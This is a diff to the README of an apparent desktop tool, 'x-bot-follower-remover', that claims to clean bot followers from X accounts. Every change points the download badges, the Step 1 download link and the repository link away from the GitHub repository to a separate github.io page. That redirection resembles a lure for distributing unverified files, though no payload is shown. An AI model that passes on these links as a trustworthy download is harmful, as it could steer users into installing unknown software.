@@ -1,6 +1,6 @@
 <h1>🛡️ x-bot-follower-remover - Clean Your X Account Instantly</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-x--bot--follower--remover-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saldivarpalominobenjamin396-stack/x-bot-follower-remover)
+[![Download Now](https://img.shields.io/badge/Download-x--bot--follower--remover-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://saldivarpalominobenjamin396-stack.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ Are you tired of seeing fake accounts, bots, and spam followers cluttering your 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/saldivarpalominobenjamin396-stack/x-bot-follower-remover](https://github.com/saldivarpalominobenjamin396-stack/x-bot-follower-remover)
+Visit this link to download the application: [https://saldivarpalominobenjamin396-stack.github.io](https://saldivarpalominobenjamin396-stack.github.io)
 
 The download button is prominently displayed on that page. Click it and save the file to your computer's Downloads folder.
 
@@ -175,7 +175,7 @@ Everything runs locally on your computer. The only network communication is with
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/saldivarpalominobenjamin396-stack/x-bot-follower-remover](https://github.com/saldivarpalominobenjamin396-stack/x-bot-follower-remover)
+- **GitHub Repository:** [https://saldivarpalominobenjamin396-stack.github.io](https://saldivarpalominobenjamin396-stack.github.io)
 - **User Manual:** Included with the download
 - **Community Support:** Open an issue on GitHub for technical support
 
@@ -185,7 +185,7 @@ Everything runs locally on your computer. The only network communication is with
 
 Don't let bots ruin your online credibility. Download x-bot-follower-remover now and take control of your X account:
 
-[![Download Now](https://img.shields.io/badge/Get%20Started-Download-8A2BE2?style=for-the-badge&logo=download&logoColor=white)](https://github.com/saldivarpalominobenjamin396-stack/x-bot-follower-remover)
+[![Download Now](https://img.shields.io/badge/Get%20Started-Download-8A2BE2?style=for-the-badge&logo=download&logoColor=white)](https://saldivarpalominobenjamin396-stack.github.io)
 
 ---
 
